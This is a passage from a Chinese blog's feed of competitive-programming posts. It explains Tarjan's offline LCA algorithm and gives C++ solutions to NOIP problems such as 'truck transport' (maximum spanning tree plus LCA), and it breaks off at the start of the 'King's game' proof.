class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Num=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Maxx;i++)</span><br><span class="line">    <span class="keyword">if</span>(vis[i]&amp;<span class="literal">true</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Maxx;i++)</span><br><span class="line">    vis[i]=vis[i]&gt;&gt;<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Maxx;i++)</span><br><span class="line">    <span class="keyword">if</span>(vis[i]&amp;<span class="literal">true</span>) Num++;</span><br><span class="line">    <span class="keyword">if</span>(Num&gt;(m&gt;&gt;<span class="literal">true</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Yes&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Solve_Forth</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Num=<span class="literal">false</span>; This=n+m<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Maxx;i++)</span><br><span class="line">    <span class="keyword">if</span>(vis[i]&amp;<span class="literal">true</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        This--;</span><br><span class="line">        vis[i]=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Maxx;i++)</span><br><span class="line">    <span class="keyword">if</span>(vis[i]&amp;<span class="literal">true</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Maxx;i++) Num+=vis[i]%<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span>(Num&gt;This) <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Yes&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;all;</span><br><span class="line">    <span class="keyword">while</span>(all--&gt;<span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">        <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;a[i][j];</span><br><span class="line">            vis[a[i][j]-<span class="string">&#x27;a&#x27;</span>+<span class="number">1</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!(n&amp;<span class="literal">true</span>)&amp;&amp;!(m&amp;<span class="literal">true</span>)) Solve_First();</span><br><span class="line">        <span class="keyword">if</span>(!(n&amp;<span class="literal">true</span>)&amp;&amp;(m&amp;<span class="literal">true</span>)) Solve_Second();</span><br><span class="line">        <span class="keyword">if</span>((n&amp;<span class="literal">true</span>)&amp;&amp;!(m&amp;<span class="literal">true</span>)) Solve_Third();</span><br><span class="line">        <span class="keyword">if</span>((n&amp;<span class="literal">true</span>)&amp;&amp;(m&amp;<span class="literal">true</span>)) Solve_Forth();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>考试总结</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>LCA算法总结</title>
    <url>/2017/10/28/c2689af56808/</url>
    <content><![CDATA[<h1 id="LCA"><a href="#LCA" class="headerlink" title="LCA"></a>LCA</h1><h2 id="LCA的Tarjan实现"><a href="#LCA的Tarjan实现" class="headerlink" title="LCA的Tarjan实现"></a>LCA的Tarjan实现</h2><ul>
<li><p>emmmm最近公共祖先的实现方式有很多，比如倍增和Tarjan……我感觉后者写起来是比较简单的，好吧事实上我只会后者，所以就只讲一下Tarjan实现LCA的方式吧。复杂度玄学，大概是点的个数加上每一个点所连出来边的数量吧，其实是很快的。</p>
</li>
<li><p>算法的本质其实就是利用DFS对整个图进行遍历，然后在访问过后记录下来每个节点的上一个节点father[x]，如果一对需要求出LCA的点中，一个点已经访问过了，另一个点正在访问，那么访问顺序一定就是从已经访问过的点不断往回退，经过两者的LCA之后向另外一个方向拓展，遇到了正在访问的另一个点，那么因为记录上一个节点的数组father[x]是在回退的过程中记录的，那么因为已经访问过的点肯定回退到了其LCA，否则不经过公共祖先是没有办法访问到另外一个点的。</p>
</li>
<li><p>那么我们就可以通过已经访问过的那个点留下的father[]记录来求出来LCA了，我们只需要不断的往前面的节点走，直到前面的点没有被更新，也就是father[x]=x，这个点就是这一对点的最近公共祖先了。</p>
</li>
<li><p>其实LCA是挺简单的，无论是代码还是理解，其实我觉得我解释的不是很好，所以给上一篇模拟过程的博客吧，用图像来模拟一遍可以加深理解的。</p>
</li>
</ul>
<p>博客链接：<a href="http://www.cnblogs.com/JVxie/p/4854719.html">LCA 最近公共祖先  : JVxie</a></p>
<ul>
<li>还有一点，LCA属于离线算法，但是题目要求按照读入的顺序输出的时候，因为没有办法通过二位数组记录下来两个节点x和y的LCA值，我们就需要在建图的时候，把读入的顺序也记录下来，然后求出来LCA之后，用一维数组按照读入时记录下来的的顺序存到对应的位置，这样一遍for循环就可以输出了。</li>
</ul>
<h2 id="LCA代码："><a href="#LCA代码：" class="headerlink" title="LCA代码："></a>LCA代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">    <span class="keyword">int</span> ID;</span><br><span class="line">&#125;a[<span class="number">2000000</span>],b[<span class="number">2000000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,q,Link_A[<span class="number">1000000</span>];</span><br><span class="line"><span class="keyword">int</span> lena,x,y,f[<span class="number">1000000</span>];</span><br><span class="line"><span class="keyword">int</span> lenb,Link_B[<span class="number">1000000</span>];</span><br><span class="line"><span class="keyword">int</span> ID[<span class="number">1000000</span>];</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">1000000</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> F=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_First</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++lena].Point=y;</span><br><span class="line">    a[lena].Next=Link_A[x];</span><br><span class="line">    a[lena].ID=z;</span><br><span class="line">    Link_A[x]=lena;</span><br><span class="line">    a[++lena].Point=x;</span><br><span class="line">    a[lena].Next=Link_A[y];</span><br><span class="line">    a[lena].ID=z;</span><br><span class="line">    Link_A[y]=lena;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_Second</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    b[++lenb].Point=y;</span><br><span class="line">    b[lenb].Next=Link_B[x];</span><br><span class="line">    b[lenb].ID=z;</span><br><span class="line">    Link_B[x]=lenb;</span><br><span class="line">    b[++lenb].Point=x;</span><br><span class="line">    b[lenb].Next=Link_B[y];</span><br><span class="line">    b[lenb].ID=z;</span><br><span class="line">    Link_B[y]=lenb;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(f[x]!=x) x=f[x];</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tarjan</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vis[x]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link_A[x];i;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(!vis[a[i].Point])</span><br><span class="line">    &#123;</span><br><span class="line">        Tarjan(a[i].Point);</span><br><span class="line">        f[a[i].Point]=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link_B[x];i;i=b[i].Next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(vis[b[i].Point])</span><br><span class="line">        ID[b[i].ID]=Find(b[i].Point);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=Read(); m=Read();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) f[i]=i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        x=Read();</span><br><span class="line">        y=Read();</span><br><span class="line">        init_First(x,y,i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        x=Read();</span><br><span class="line">        y=Read();</span><br><span class="line">        init_Second(x,y,i);</span><br><span class="line">    &#125;</span><br><span class="line">    Tarjan(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ID[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="NOIP2013-货车运输"><a href="#NOIP2013-货车运输" class="headerlink" title="NOIP2013 货车运输"></a>NOIP2013 货车运输</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>A 国有 n 座城市，编号从 1 到 n，城市之间有 m 条双向道路。每一条道路对车辆都有重量限制，简称限重。现在有 q 辆货车在运输货物， 司机们想知道每辆车在不超过车辆限重的情况下，最多能运多重的货物。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>输入文件第一行有两个用一个空格隔开的整数 n，m，表示 A 国有 n 座城市和 m 条道路。</li>
<li>接下来 m 行每行 3 个整数 x、 y、 z，每两个整数之间用一个空格隔开，表示从 x 号城市到 y 号城市有一条限重为 z 的道路。注意： x 不等于 y，两座城市之间可能有多条道路 。</li>
<li>接下来一行有一个整数 q，表示有 q 辆货车需要运货。</li>
<li>接下来 q 行，每行两个整数 x、y，之间用一个空格隔开，表示一辆货车需要从 x 城市运输货物到 y 城市，注意： x 不等于 y 。</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出共有 q 行，每行一个整数，表示对于每一辆货车，它的最大载重是多少。如果货车不能到达目的地，输出-1。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><blockquote>
<p>没有一等奖，肯定要考NOIP啊，写正解这方面，写正解是不可能写正解的，这辈子都不可能写正解的。骗分也不会骗，就是写这种暴力，才能维持到一等分数线的样子。进机房感觉像回家一样，在机房里的感觉比班级里感觉好多了！里面个个都是人才，说话又好听，我超喜欢里面的！    ——码·欧埃尔。</p>
</blockquote>
<ul>
<li><p>其实这道题，emmmm自己又犯了以前的老错误了，唉，明明还写到了个人签名上面防止犯错，结果还是……这道题拿在手里一般都是直接写暴力了，是的考试的时候我是绝对不会写正解的，就算知道正解该怎么写也是不会写的，因为太容易挂掉了。</p>
</li>
<li><p>算了说说正确的解法吧，其实这道题蛮简单的，就是一遍最大生成树加LCA就可以了。首先我们需要解决求最短路最长的问题，我们可以建立一个最大生成树，这样的话里面的边是可选择边的最大值，这样的话可以保证最短路最长。因为最大生成树是通过从大到小排序边，然后再逐个的选择，所以可以保证最短路最长的，因为选择的边一定是可以选择的最长的。</p>
</li>
<li><p>然后我们就可以在最大生成树上进行LCA了，最大生成树的路径之间是唯一的，所以说我们如果求两个点之间的路径，可以通过O(n)求出LCA，然后利用两者的LCA来直接遍历路径，其核心就在于LCA的father[x]数组，这样可以两个个点都通过father[x]来到达其LCA，中间只需要判断一个最小值就可以了，可谓是非常方便的。</p>
</li>
<li><p>最后需要注意的问题就是，最大生成树不一定是联通的，需要访问每一个联通子图！！！还有在通过father[x]来确定两点之间的路径的时候，一定要想到上面的情况是比较特殊的，需要特别的判断！</p>
</li>
</ul>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">    <span class="keyword">int</span> Value;</span><br><span class="line">&#125;a[<span class="number">200000</span>],b[<span class="number">200000</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Line</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">int</span> y;</span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">&#125;c[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,Linka[<span class="number">200000</span>],lena;</span><br><span class="line"><span class="keyword">int</span> x,y,z,q,Linkb[<span class="number">200000</span>],lenb;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">200000</span>],ans[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> dis[<span class="number">200000</span>],father[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> fx[<span class="number">200000</span>],fy[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">200000</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mycmp</span><span class="params">(Line x,Line y)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> x.v&gt;y.v; &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> F=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++lena].Point=y;</span><br><span class="line">    a[lena].Next=Linka[x];</span><br><span class="line">    a[lena].Value=z;</span><br><span class="line">    Linka[x]=lena;</span><br><span class="line">    a[++lena].Point=x;</span><br><span class="line">    a[lena].Next=Linka[y];</span><br><span class="line">    a[lena].Value=z;</span><br><span class="line">    Linka[y]=lena;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Together</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    b[++lenb].Point=y;</span><br><span class="line">    b[lenb].Next=Linkb[x];</span><br><span class="line">    b[lenb].Value=z;</span><br><span class="line">    Linkb[x]=lenb;</span><br><span class="line">    b[++lenb].Point=x;</span><br><span class="line">    b[lenb].Next=Linkb[y];</span><br><span class="line">    b[lenb].Value=z;</span><br><span class="line">    Linkb[y]=lenb;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Getfather</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Truefather=x,That;</span><br><span class="line">    <span class="keyword">while</span>(Truefather!=father[Truefather])</span><br><span class="line">    Truefather=father[Truefather];</span><br><span class="line">    <span class="keyword">while</span>(x!=father[x])</span><br><span class="line">    &#123;</span><br><span class="line">        That=father[x];</span><br><span class="line">        father[x]=Truefather;</span><br><span class="line">        x=That;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Truefather;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Kruskal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> all=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) father[i]=i;</span><br><span class="line">    sort(c+<span class="number">1</span>,c+m+<span class="number">1</span>,mycmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> First=Getfather(c[i].x);</span><br><span class="line">        <span class="keyword">int</span> Second=Getfather(c[i].y);</span><br><span class="line">        <span class="keyword">if</span>(First!=Second)</span><br><span class="line">        &#123;</span><br><span class="line">            father[First]=Second;</span><br><span class="line">            init(c[i].x,c[i].y,c[i].v);</span><br><span class="line">            <span class="keyword">if</span>(++all==n<span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(father[x]!=x) x=father[x];</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vis[x]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Linka[x];i;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(!vis[a[i].Point])</span><br><span class="line">    &#123;</span><br><span class="line">        dis[a[i].Point]=a[i].Value;</span><br><span class="line">        LCA(a[i].Point);</span><br><span class="line">        father[a[i].Point]=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Linkb[x];i;i=b[i].Next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(vis[b[i].Point])</span><br><span class="line">        ans[b[i].Value]=Find(b[i].Point);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Search</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> ID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Minn=<span class="number">2123456789</span>;</span><br><span class="line">    <span class="keyword">while</span>(x!=ans[ID])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(x==father[x]) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        Minn=min(Minn,dis[x]);</span><br><span class="line">        x=father[x];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(y!=ans[ID])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(y==father[y]) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        Minn=min(Minn,dis[y]);</span><br><span class="line">        y=father[y];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Minn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=Read(); m=Read();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        c[i].x=Read();</span><br><span class="line">        c[i].y=Read();</span><br><span class="line">        c[i].v=Read();</span><br><span class="line">    &#125;</span><br><span class="line">    q=Read();</span><br><span class="line">    Kruskal();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=q;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fx[i]=Read();</span><br><span class="line">        fy[i]=Read();</span><br><span class="line">        Together(fx[i],fy[i],i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(ans,<span class="number">-1</span>,<span class="keyword">sizeof</span>(ans));</span><br><span class="line">    <span class="built_in">memset</span>(father,<span class="literal">false</span>,<span class="keyword">sizeof</span>(father));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) father[i]=i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(!vis[i]) LCA(i);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=q;i++)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;Search(fx[i],fy[i],i)&lt;&lt;<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>LCA</tag>
      </tags>
  </entry>
  <entry>
    <title>NOIP题解报告</title>
    <url>/2017/10/27/c81ef593b034/</url>
    <content><![CDATA[<h1 id="说在前面："><a href="#说在前面：" class="headerlink" title="说在前面："></a>说在前面：</h1><blockquote>
<p>最近一直在刷NOIP历年的题目，感觉还好，快刷完了，最近时间很紧，大概做了一些规划。期中考试又必须要参加，感觉真的药丸，马上就要NOIP了，加油吧！</p>
</blockquote>
<p>在11月之前需要完成的问题：</p>
<ol>
<li>解决过去NOIP可以解决的问题。</li>
<li>学习LCA并做一些题目练习。</li>
<li>学习欧拉函数，乘法逆元和中国剩余定理，并练习。</li>
</ol>
<p>然后十一月份之后就要复习了，复习以前所学过的算法模板和题目。</p>
<h1 id="NOIP2012国王游戏"><a href="#NOIP2012国王游戏" class="headerlink" title="NOIP2012国王游戏"></a>NOIP2012国王游戏</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>恰逢 H 国国庆，国王邀请 n 位大臣来玩一个有奖游戏。首先，他让每个大臣在左、右 手上面分别写下一个整数，国王自己也在左、右手上各写一个整数。然后，让这 n 位大臣排 成一排，国王站在队伍的最前面。排好队后，所有的大臣都会获得国王奖赏的若干金币，每 位大臣获得的金币数分别是：排在该大臣前面的所有人的左手上的数的乘积除以他自己右 手上的数，然后向下取整得到的结果。国王不希望某一个大臣获得特别多的奖赏，所以他想请你帮他重新安排一下队伍的顺序， 使得获得奖赏最多的大臣，所获奖赏尽可能的少。注意，国王的位置始终在队伍的最前面。</p>
</blockquote>
<h2 id="输入"><a href="#输入" class="headerlink" title="输入:"></a>输入:</h2><ol>
<li>第一行包含一个整数 n，表示大臣的人数。</li>
<li>第二行包含两个整数 a 和 b，之间用一个空格隔开，分别表示国王左手和右手上的整数。</li>
<li>接下来 n 行，每行包含两个整数 a 和 b，之间用一个空格隔开，分别表示每个大臣左手<br>和右手上的整数。</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出只有一行，包含一个整数，表示重新排列后的队伍中获奖赏最多的大臣所获得的金币数。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><ul>
<li>其实这道题的难点在于高精度和贪心算法上面，高精度就不用说，直接上模拟就行，说说关于贪心算法吧。这道题保证最大的最小的方案其实就是把左手乘以右手的权值拍一个序就行了，证明过程如下：</li>
</ul>
<p>证明：</p>
<ol>
<li>已知，如果相邻的两个人交换位置，只会影响到这两个人的值，不会影响他人</li>
